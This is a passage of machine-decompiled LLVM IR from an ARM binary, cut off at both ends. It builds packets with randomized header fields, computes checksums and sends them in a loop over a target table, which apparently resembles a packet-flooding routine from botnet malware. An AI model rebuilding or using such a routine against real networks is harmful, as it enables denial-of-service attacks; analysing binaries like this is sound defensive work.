  %v0_c53c = load i32, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c53c, 13
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v1_c418, i32* %r3.global-to-local, align 4
  %v1_c544 = and i32 %v4_c53c, 253
  %v4_c548 = or i32 %v1_c544, %v3_c548
  store i32 %v4_c548, i32* %r2.global-to-local, align 4
  %v1_c54c = trunc i32 %v4_c548 to i8
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c550 = load i32, i32* %r1.global-to-local, align 4
  %v1_c550 = add i32 %v0_c550, 13
  %v2_c550 = inttoptr i32 %v1_c550 to i8*
  %v3_c550 = load i8, i8* %v2_c550, align 1
  %v4_c550 = zext i8 %v3_c550 to i32
  store i32 %v1_c41c, i32* %r0.global-to-local, align 4
  %v1_c558 = and i32 %v4_c550, 254
  %v2_c55c = or i32 %v1_c558, %v1_c41c
  store i32 %v2_c55c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v2_c55c to i8
  store i8 %v1_c560, i8* %v2_c550, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c56c = load i32, i32* %r4.global-to-local, align 4
  %v3_c56c = add i32 %v2_c56c, 40
  %v4_c56c = inttoptr i32 %v3_c56c to i8*
  store i8 2, i8* %v4_c56c, align 1
  %v0_c570 = load i32, i32* %r2.global-to-local, align 4
  %v1_c570 = trunc i32 %v0_c570 to i8
  %v2_c570 = load i32, i32* %r4.global-to-local, align 4
  %v3_c570 = add i32 %v2_c570, 41
  %v4_c570 = inttoptr i32 %v3_c570 to i8*
  store i8 %v1_c570, i8* %v4_c570, align 1
  %v0_c574 = call i32 @function_e7dc()
  %v1_c578 = urem i32 %v0_c574, 16
  %v1_c57c = or i32 %v1_c578, 1392
  %tmp66 = mul nuw nsw i32 %v1_c57c, 256
  %v3_c588 = add nuw nsw i32 %tmp66, 2048
  %v5_c590 = or i32 %v3_c588, 5
  %v1_c594 = trunc i32 %v5_c590 to i16
  %v2_c594 = load i32, i32* %r4.global-to-local, align 4
  %v3_c594 = add i32 %v2_c594, 42
  %v4_c594 = inttoptr i32 %v3_c594 to i16*
  store i16 %v1_c594, i16* %v4_c594, align 2
  %v2_c59c = load i32, i32* %r4.global-to-local, align 4
  %v3_c59c = add i32 %v2_c59c, 44
  %v4_c59c = inttoptr i32 %v3_c59c to i8*
  store i8 4, i8* %v4_c59c, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c5ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c5ac = add i32 %v2_c5ac, 46
  %v4_c5ac = inttoptr i32 %v3_c5ac to i8*
  store i8 8, i8* %v4_c5ac, align 1
  %v0_c5b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5b0 = trunc i32 %v0_c5b0 to i8
  %v2_c5b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5b0 = add i32 %v2_c5b0, 47
  %v4_c5b0 = inttoptr i32 %v3_c5b0 to i8*
  store i8 %v1_c5b0, i8* %v4_c5b0, align 1
  %v0_c5b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_c5b4 = trunc i32 %v0_c5b4 to i8
  %v2_c5b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5b4 = add i32 %v2_c5b4, 45
  %v4_c5b4 = inttoptr i32 %v3_c5b4 to i8*
  store i8 %v1_c5b4, i8* %v4_c5b4, align 1
  %v0_c5b8 = call i32 @function_e7dc()
  store i32 %v0_c5b8, i32* %r0.global-to-local, align 4
  %v2_c5c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5c0 = add i32 %v2_c5c0, 59
  %v4_c5c0 = inttoptr i32 %v3_c5c0 to i8*
  store i8 6, i8* %v4_c5c0, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c5d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c5d0 = add i32 %v1_c5d0, 48
  %v3_c5d0 = inttoptr i32 %v2_c5d0 to i32*
  store i32 %v0_c5b8, i32* %v3_c5d0, align 4
  %v0_c5d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c5d4 = add i32 %v1_c5d4, 52
  %v3_c5d4 = inttoptr i32 %v2_c5d4 to i32*
  store i32 %v0_c5d4, i32* %v3_c5d4, align 4
  %v0_c5d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5d8 = trunc i32 %v0_c5d8 to i8
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 56
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 %v1_c5d8, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 58
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 57
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v3_c5e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c5e4, i32* %r3.global-to-local, align 4
  %v1_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_c5e8 = add i32 %v1_c5e8, %v3_c5e4
  store i32 %v2_c5e8, i32* @r4, align 4
  %v1_c5ec = load i32, i32* @r7, align 4
  %v9_c5ec = icmp eq i32 %v2_c5e8, %v1_c5ec
  store i1 %v9_c5ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c5e8, i32* %stack_var_-44, align 4
  %v5_c5f4 = icmp slt i32 %v2_c5e8, %v1_c5ec
  br i1 %v5_c5f4, label %dec_label_pc_c43c, label %dec_label_pc_c5f8.preheader

dec_label_pc_c5f8.preheader:                      ; preds = %bb61, %dec_label_pc_c36c
  %v0_c5fc6 = phi i32 [ 0, %dec_label_pc_c36c ], [ %v1_c5ec, %bb61 ]
  %v3_c774 = icmp eq i32 %v6_c320, -1
  %v8_c774 = icmp eq i32 %v6_c320, -1
  %v3_c644 = icmp eq i32 %v3_c388, 65535
  br label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5f8, %dec_label_pc_c708, %dec_label_pc_c5f8.preheader
  %v0_c5fc = phi i32 [ %v0_c5fc6, %dec_label_pc_c5f8.preheader ], [ 0, %dec_label_pc_c708 ], [ 0, %dec_label_pc_c5f8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c5fc = icmp eq i32 %v0_c5fc, 0
  store i1 %v2_c5fc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c5fc, label %dec_label_pc_c5f8, label %dec_label_pc_c608

dec_label_pc_c608:                                ; preds = %dec_label_pc_c5f8, %dec_label_pc_c708
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c60c

dec_label_pc_c60c:                                ; preds = %dec_label_pc_c684, %dec_label_pc_c608
  %v1_c61c = phi i32 [ %v1_c6f8, %dec_label_pc_c684 ], [ 0, %dec_label_pc_c608 ]
  %v5_c610 = mul i32 %v1_c61c, 24
  %v1_c614 = load i32, i32* @r8, align 4
  %v2_c614 = add i32 %v1_c614, %v5_c610
  store i32 %v2_c614, i32* %r3.global-to-local, align 4
  %v1_c618 = add i32 %v2_c614, 20
  %v2_c618 = inttoptr i32 %v1_c618 to i8*
  %v3_c618 = load i8, i8* %v2_c618, align 1
  %v4_c618 = zext i8 %v3_c618 to i32
  store i32 %v4_c618, i32* %r2.global-to-local, align 4
  %v0_c61c = load i32, i32* @sb, align 4
  %v4_c61c = mul i32 %v1_c61c, 4
  %v5_c61c = add i32 %v0_c61c, %v4_c61c
  %v6_c61c = inttoptr i32 %v5_c61c to i32*
  %v7_c61c = load i32, i32* %v6_c61c, align 4
  store i32 %v7_c61c, i32* @r5, align 4
  %v7_c620 = icmp eq i8 %v3_c618, 31
  store i1 %v7_c620, i1* %cpsr_z.global-to-local, align 1
  %v1_c624 = add i32 %v7_c61c, 20
  store i32 %v1_c624, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c618, 32
  br i1 %tmp67, label %dec_label_pc_c71c, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c60c
  store i32 %v6_c320, i32* %r3.global-to-local, align 4
  store i1 %v8_c774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c774, label %dec_label_pc_c77c, label %dec_label_pc_c638

dec_label_pc_c638:                                ; preds = %dec_label_pc_c71c, %dec_label_pc_c62c
  store i32 %v3_c388, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c644, label %dec_label_pc_c798, label %dec_label_pc_c64c

dec_label_pc_c64c:                                ; preds = %dec_label_pc_c77c, %dec_label_pc_c638
  %v1_c650 = phi i32 [ %v1_c78c, %dec_label_pc_c77c ], [ 65535, %dec_label_pc_c638 ]
  store i32 %v3_c38c, i32* %r1.global-to-local, align 4
  %v9_c650 = icmp eq i32 %v3_c38c, %v1_c650
  store i1 %v9_c650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c650, label %dec_label_pc_c7ac, label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c798.dec_label_pc_c658_crit_edge, %dec_label_pc_c64c
  %v1_c65c = phi i32 [ %v1_c65c.pre, %dec_label_pc_c798.dec_label_pc_c658_crit_edge ], [ %v1_c650, %dec_label_pc_c64c ]
  store i32 %v3_c390, i32* %r2.global-to-local, align 4
  %v9_c65c = icmp eq i32 %v3_c390, %v1_c65c
  store i1 %v9_c65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c65c, label %dec_label_pc_c7c0, label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c7ac.dec_label_pc_c664_crit_edge, %dec_label_pc_c658
  %v1_c668 = phi i32 [ %v1_c668.pre, %dec_label_pc_c7ac.dec_label_pc_c664_crit_edge ], [ %v1_c65c, %dec_label_pc_c658 ]
  store i32 %v5_c25c, i32* %r3.global-to-local, align 4
  %v9_c668 = icmp eq i32 %v5_c25c, %v1_c668
  store i1 %v9_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c668, label %dec_label_pc_c7d4, label %dec_label_pc_c670

dec_label_pc_c670:                                ; preds = %dec_label_pc_c7c0.dec_label_pc_c670_crit_edge, %dec_label_pc_c664
  %v1_c674 = phi i32 [ %v1_c674.pre, %dec_label_pc_c7c0.dec_label_pc_c670_crit_edge ], [ %v1_c668, %dec_label_pc_c664 ]
  store i32 %v6_c274, i32* %r0.global-to-local, align 4
  %v9_c674 = icmp eq i32 %v6_c274, %v1_c674
  store i1 %v9_c674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c674, label %dec_label_pc_c7e8, label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c7d4, %dec_label_pc_c670
  %v0_c67c = load i32, i32* @fp, align 4
  %v2_c67c = icmp eq i32 %v0_c67c, 0
  store i1 %v2_c67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c67c, label %dec_label_pc_c684, label %dec_label_pc_c7f8

dec_label_pc_c684:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c7e8, %dec_label_pc_c7f8
  %v2_c688 = load i32, i32* @r5, align 4
  %v3_c688 = add i32 %v2_c688, 10
  %v4_c688 = inttoptr i32 %v3_c688 to i16*
  store i16 0, i16* %v4_c688, align 2
  %v0_c68c = load i32, i32* @r5, align 4
  store i32 %v0_c68c, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c694 = call i32 @function_cef4(i32 %v0_c68c, i32 20)
  %v3_c694 = trunc i32 %v2_c694 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c69c = load i32, i32* @r5, align 4
  %v4_c69c = add i32 %v3_c69c, 10
  %v5_c69c = inttoptr i32 %v4_c69c to i16*
  store i16 %v3_c694, i16* %v5_c69c, align 2
  %v0_c6a0 = load i32, i32* @r6, align 4
  store i32 %v0_c6a0, i32* @r1, align 4
  %v0_c6a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6a4 = trunc i32 %v0_c6a4 to i16
  %v3_c6a4 = add i32 %v0_c6a0, 16
  %v4_c6a4 = inttoptr i32 %v3_c6a4 to i16*
  store i16 %v1_c6a4, i16* %v4_c6a4, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %r0.global-to-local, align 4
  %v4_c6b4 = call i32 @function_cf44(i32 %v0_c6b0, i32 %v0_c6a0, i32 10240, i32 40)
  %v5_c6b4 = trunc i32 %v4_c6b4 to i16
  store i32 %v4_c6b4, i32* %r0.global-to-local, align 4
  %v3_c6b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c6b8, i32* %r3.global-to-local, align 4
  %v3_c6bc = mul i32 %v3_c6b8, 32
  store i32 %v3_c6bc, i32* %lr.global-to-local, align 4
  %v3_c6c0 = load i32, i32* @r6, align 4
  %v4_c6c0 = add i32 %v3_c6c0, 16
  %v5_c6c0 = inttoptr i32 %v4_c6c0 to i16*
  store i16 %v5_c6b4, i16* %v5_c6c0, align 2
  %v0_c6c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c6c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c6c4, -8
  %v5_c6c4 = add i32 %v0_c6c4, %tmp68
  store i32 %v5_c6c4, i32* %lr.global-to-local, align 4
  %v0_c6c8 = load i32, i32* @r6, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 2
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i16*
  %v3_c6c8 = load i16, i16* %v2_c6c8, align 2
  %v1_c6cc = load i32, i32* @r8, align 4
  %v2_c6cc = add i32 %v1_c6cc, %v5_c6c4
  store i32 %v2_c6cc, i32* @lr, align 4
  %v3_c6d0 = add i32 %v2_c6cc, 2
  %v4_c6d0 = inttoptr i32 %v3_c6d0 to i16*
  store i16 %v3_c6c8, i16* %v4_c6d0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c6dc = load i32, i32* @r5, align 4
  store i32 %v0_c6dc, i32* %r1.global-to-local, align 4
  %v0_c6e0 = load i32, i32* @sl, align 4
  store i32 %v0_c6e0, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c6e8 = load i32, i32* @lr, align 4
  %v6_c6f0 = call i32 @function_10d6c(i32 %v0_c6e0, i32 %v0_c6dc, i32 60, i32 16384, i32 %v0_c6e8, i32 16)
  %v3_c6f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c6f4, i32* %r3.global-to-local, align 4
  %v1_c6f8 = add i32 %v3_c6f4, 1
  store i32 %v1_c6f8, i32* %r0.global-to-local, align 4
  %v1_c6fc = load i32, i32* @r7, align 4
  %v9_c6fc = icmp eq i32 %v1_c6f8, %v1_c6fc
  store i1 %v9_c6fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c6f8, i32* %stack_var_-44, align 4
  %v5_c704 = icmp slt i32 %v1_c6f8, %v1_c6fc
  br i1 %v5_c704, label %dec_label_pc_c60c, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c684
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c70c = icmp eq i32 %v1_c6fc, 0
  store i1 %v2_c70c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c70c, label %dec_label_pc_c5f8, label %dec_label_pc_c608

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c60c
  %v1_c71c = add i32 %v2_c614, 16
  %v2_c71c = inttoptr i32 %v1_c71c to i32*
  %v3_c71c = load i32, i32* %v2_c71c, align 4
  store i32 %v3_c71c, i32* %r4.global-to-local, align 4
  %v0_c720 = call i32 @function_e7dc()
  store i32 %v0_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  %v5_c72c = mul i32 %v3_c724, 24
  %v0_c730 = load i32, i32* %r4.global-to-local, align 4
  %v1_c730 = and i32 %v0_c730, 16711680
  %v3_c734 = udiv i32 %v0_c730, 16777216
  %v4_c738 = udiv i32 %v1_c730, 256
  %v5_c738 = or i32 %v4_c738, %v3_c734
  store i32 %v5_c738, i32* %r2.global-to-local, align 4
  %v1_c73c = load i32, i32* @r8, align 4
  %v2_c73c = add i32 %v1_c73c, %v5_c72c
  store i32 %v2_c73c, i32* %r1.global-to-local, align 4
  %v1_c740 = and i32 %v0_c730, 65280
  store i32 %v1_c740, i32* %r3.global-to-local, align 4
  %v1_c744 = add i32 %v2_c73c, 20
  %v2_c744 = inttoptr i32 %v1_c744 to i8*
  %v3_c744 = load i8, i8* %v2_c744, align 1
  %v4_c744 = zext i8 %v3_c744 to i32
  %v5_c74c = call i32 @llvm.bswap.i32(i32 %v0_c730)
  %v7_c750 = lshr i32 %v0_c720, %v4_c744
  %v8_c750 = add i32 %v7_c750, %v5_c74c
  store i32 %v8_c750, i32* %r2.global-to-local, align 4
  %v1_c754 = and i32 %v8_c750, 16711680
  store i32 %v1_c754, i32* %r0.global-to-local, align 4
  %v1_c760 = and i32 %v8_c750, 65280
  store i32 %v1_c760, i32* %r1.global-to-local, align 4
  %v5_c768 = call i32 @llvm.bswap.i32(i32 %v8_c750)
  %v1_c76c = load i32, i32* @r5, align 4
  %v2_c76c = add i32 %v1_c76c, 16
  %v3_c76c = inttoptr i32 %v2_c76c to i32*
  store i32 %v5_c768, i32* %v3_c76c, align 4
  store i32 %v6_c320, i32* %r3.global-to-local, align 4
  store i1 %v8_c774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c774, label %dec_label_pc_c77c, label %dec_label_pc_c638

dec_label_pc_c77c:                                ; preds = %dec_label_pc_c71c, %dec_label_pc_c62c
  %v0_c77c = call i32 @function_e7dc()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c784 = load i32, i32* @r5, align 4
  %v2_c784 = add i32 %v1_c784, 12
  %v3_c784 = inttoptr i32 %v2_c784 to i32*
  store i32 %v0_c77c, i32* %v3_c784, align 4
  store i32 %v3_c388, i32* %r0.global-to-local, align 4
  %v0_c78c = load i32, i32* %r4.global-to-local, align 4
  %v1_c78c = add i32 %v0_c78c, -1
  store i32 %v1_c78c, i32* @r4, align 4
  %v9_c790 = icmp eq i32 %v3_c388, %v1_c78c
  store i1 %v9_c790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c790, label %dec_label_pc_c798, label %dec_label_pc_c64c

dec_label_pc_c798:                                ; preds = %dec_label_pc_c77c, %dec_label_pc_c638
  %v0_c798 = call i32 @function_e7dc()
  %v1_c798 = trunc i32 %v0_c798 to i16
  store i32 %v0_c798, i32* %r0.global-to-local, align 4
  store i32 %v3_c38c, i32* %r1.global-to-local, align 4
  %v1_c7a0 = load i32, i32* @r4, align 4
  %v9_c7a0 = icmp eq i32 %v3_c38c, %v1_c7a0
  store i1 %v9_c7a0, i1* %cpsr_z.global-to-local, align 1
  %v3_c7a4 = load i32, i32* @r5, align 4
  %v4_c7a4 = add i32 %v3_c7a4, 4
  %v5_c7a4 = inttoptr i32 %v4_c7a4 to i16*
  store i16 %v1_c798, i16* %v5_c7a4, align 2
  br i1 %v9_c7a0, label %dec_label_pc_c7ac, label %dec_label_pc_c798.dec_label_pc_c658_crit_edge

dec_label_pc_c798.dec_label_pc_c658_crit_edge:    ; preds = %dec_label_pc_c798
  %v1_c65c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c658

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c798, %dec_label_pc_c64c
  %v0_c7ac = call i32 @function_e7dc()
  %v1_c7ac = trunc i32 %v0_c7ac to i16
  store i32 %v0_c7ac, i32* %r0.global-to-local, align 4
  store i32 %v3_c390, i32* %r2.global-to-local, align 4
  %v1_c7b4 = load i32, i32* @r4, align 4
  %v9_c7b4 = icmp eq i32 %v3_c390, %v1_c7b4
  store i1 %v9_c7b4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7b8 = load i32, i32* @r5, align 4
  %v4_c7b8 = add i32 %v3_c7b8, 20
  %v5_c7b8 = inttoptr i32 %v4_c7b8 to i16*
  store i16 %v1_c7ac, i16* %v5_c7b8, align 2
  br i1 %v9_c7b4, label %dec_label_pc_c7c0, label %dec_label_pc_c7ac.dec_label_pc_c664_crit_edge

dec_label_pc_c7ac.dec_label_pc_c664_crit_edge:    ; preds = %dec_label_pc_c7ac
  %v1_c668.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c664

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7ac, %dec_label_pc_c658
  %v0_c7c0 = call i32 @function_e7dc()
  %v1_c7c0 = trunc i32 %v0_c7c0 to i16
  store i32 %v0_c7c0, i32* %r0.global-to-local, align 4
  store i32 %v5_c25c, i32* %r3.global-to-local, align 4
  %v1_c7c8 = load i32, i32* @r4, align 4
  %v9_c7c8 = icmp eq i32 %v5_c25c, %v1_c7c8
  store i1 %v9_c7c8, i1* %cpsr_z.global-to-local, align 1
  %v3_c7cc = load i32, i32* @r6, align 4
  %v4_c7cc = add i32 %v3_c7cc, 2
  %v5_c7cc = inttoptr i32 %v4_c7cc to i16*
  store i16 %v1_c7c0, i16* %v5_c7cc, align 2
  br i1 %v9_c7c8, label %dec_label_pc_c7d4, label %dec_label_pc_c7c0.dec_label_pc_c670_crit_edge

dec_label_pc_c7c0.dec_label_pc_c670_crit_edge:    ; preds = %dec_label_pc_c7c0
  %v1_c674.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c670

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7c0, %dec_label_pc_c664
  %v0_c7d4 = call i32 @function_e7dc()
  %v1_c7d8 = load i32, i32* @r6, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 4
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v0_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c274, i32* %r0.global-to-local, align 4
  %v1_c7e0 = load i32, i32* @r4, align 4
  %v9_c7e0 = icmp eq i32 %v6_c274, %v1_c7e0
  store i1 %v9_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c67c

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7d4, %dec_label_pc_c670
  %v0_c7e8 = call i32 @function_e7dc()
  store i32 %v0_c7e8, i32* %r0.global-to-local, align 4
  %v0_c7ec = load i32, i32* @fp, align 4
  %v2_c7ec = icmp eq i32 %v0_c7ec, 0
  store i1 %v2_c7ec, i1* %cpsr_z.global-to-local, align 1
  %v1_c7f0 = load i32, i32* @r6, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 8
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  br i1 %v2_c7ec, label %dec_label_pc_c684, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c7e8
  %v0_c7f8 = call i32 @function_e7dc()
  %v1_c7f8 = trunc i32 %v0_c7f8 to i16
  store i32 %v0_c7f8, i32* %r0.global-to-local, align 4
  %v3_c7fc = load i32, i32* @r6, align 4
  %v4_c7fc = add i32 %v3_c7fc, 18
  %v5_c7fc = inttoptr i32 %v4_c7fc to i16*
  store i16 %v1_c7f8, i16* %v5_c7fc, align 2
  br label %dec_label_pc_c684

dec_label_pc_c804:                                ; preds = %dec_label_pc_c344
  %v0_c804 = load i32, i32* @sl, align 4
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  %v1_c808 = call i32 @function_10608(i32 %v0_c804)
  store i32 %v1_c808, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c80c

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c804
  %v1_c814 = phi i32 [ %v3_c334, %dec_label_pc_c170 ], [ %v1_c808, %dec_label_pc_c804 ]
  store i32 %v3_c170, i32* %r4.global-to-local, align 4
  store i32 %v24_c170, i32* %fp.global-to-local, align 4
  store i32 %v27_c170, i32* %lr.global-to-local, align 4
  ret i32 %v1_c814

; uselistorder directives
  uselistorder i32 %v0_c7f8, { 1, 0 }
  uselistorder i32 %v0_c7c0, { 1, 0 }
  uselistorder i32 %v0_c7ac, { 1, 0 }
  uselistorder i32 %v0_c798, { 1, 0 }
  uselistorder i32 %v1_c78c, { 1, 2, 0 }
  uselistorder i32 %v0_c730, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c6f8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c6c4, { 1, 0 }
  uselistorder i32 %v4_c6b4, { 1, 0 }
  uselistorder i1 %v3_c644, { 1, 0 }
  uselistorder i32 %v2_c5e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c450, { 1, 2, 0 }
  uselistorder i32 %v1_c41c, { 2, 1, 0 }
  uselistorder i32 %v1_c418, { 2, 0, 1 }
  uselistorder i32 %v1_c414, { 2, 0, 1 }
  uselistorder i32 %v1_c410, { 2, 0, 1 }
  uselistorder i32 %v1_c3ec, { 1, 0 }
  uselistorder i32 %v3_c388, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2 }
  uselistorder i32 %v0_c378, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c364, { 1, 0 }
  uselistorder i1 %v7_c338, { 1, 0 }
  uselistorder i32 %v3_c334, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c320, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c274, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c25c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c1e0, { 1, 0 }
  uselistorder i32 %v7_c1c8, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 5, 3, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32 10240, { 3, 6, 2, 7, 1, 8, 4, 9, 5, 10, 0, 11 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 41, { 4, 0, 2, 5, 1, 6, 3, 7 }
  uselistorder i8 2, { 2, 1, 0 }
  uselistorder i8 6, { 4, 3, 5, 0, 6, 1, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c80c, { 1, 0 }
  uselistorder label %dec_label_pc_c7f8, { 1, 0 }
  uselistorder label %dec_label_pc_c684, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c608, { 1, 0 }
  uselistorder label %dec_label_pc_c5f8, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_c81c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c81c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
